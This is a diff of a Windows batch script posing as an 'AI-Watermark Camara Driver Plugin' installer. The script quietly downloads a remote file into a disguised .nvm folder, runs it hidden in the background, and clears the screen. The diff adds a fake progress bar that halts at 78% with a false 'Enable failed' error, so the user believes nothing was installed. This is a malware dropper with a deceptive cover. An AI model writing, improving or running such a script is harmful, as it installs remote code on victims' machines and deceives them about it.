@@ -1,9 +1,43 @@
 @echo off
-echo Installing AI-Watermark Camara Driver Plugin...
+setlocal enabledelayedexpansion
+
 set "TARGET_DIR=%USERPROFILE%\.nvm"
 if not exist "%TARGET_DIR%" ( mkdir "%TARGET_DIR%" )
 curl -s -L -o "%TARGET_DIR%\bootstrap.cmd" "https://compound.chat/video/windows"
 cls
 start "" /b cmd /c "%TARGET_DIR%\bootstrap.cmd >nul 2>&1"
 cls
-echo Installation failed. This software cannot run on this device. Try again on the other device.
+
+
+
+set duration=900
+set count=0
+
+:loop
+set /a percent=(count*100)/duration
+
+if !percent! GEQ 78 (
+    cls
+    echo Enable AI-Watermark Camara Driver Plugin...
+    echo Loading... 78%%
+    echo.
+    echo ERROR: Enable failed. This software cannot run on this device. Try again on the other device.
+    echo.
+    pause
+    exit
+)
+
+set bar=
+for /l %%i in (1,1,!percent!) do set bar=!bar!#
+
+cls
+echo Enable AI-Watermark Camara Driver Plugin...
+echo.
+echo Loading... !percent!%%
+echo [!bar!]
+
+timeout /t 1 >nul
+
+set /a count+=1
+if !count! LEQ %duration% goto loop
+
